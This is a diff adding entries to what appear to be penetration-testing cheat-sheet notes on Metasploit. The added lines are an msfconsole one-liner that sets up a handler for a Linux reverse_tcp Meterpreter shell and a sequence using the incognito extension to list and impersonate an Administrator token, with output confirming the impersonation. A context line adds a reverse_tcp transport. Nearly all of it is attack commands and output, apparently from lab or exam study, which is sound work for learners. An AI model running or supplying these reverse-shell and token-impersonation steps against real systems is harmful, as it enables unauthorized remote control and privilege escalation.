@@ -47,5 +47,19 @@ meterpreter> transport list
 meterpreter> transport add -t reverse_tcp -l 192.168.118.2 -p 5555
 
 
+#Automation
+sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x86/meterpreter/reverse_tcp;set LHOST 10.11.0.4;set LPORT 443;run"
 
+#Using incognito to dump tokens
+meterpreter > use incognito 
+Loading extension incognito...Success.
+
+meterpreter > list_tokens -u
+
+meterpreter > impersonate_token sandbox\\Administrator
+[+] Delegation token available
+[+] Successfully impersonated user sandbox\Administrator
+
+meterpreter > getuid
+Server username: sandbox\Administrator
 
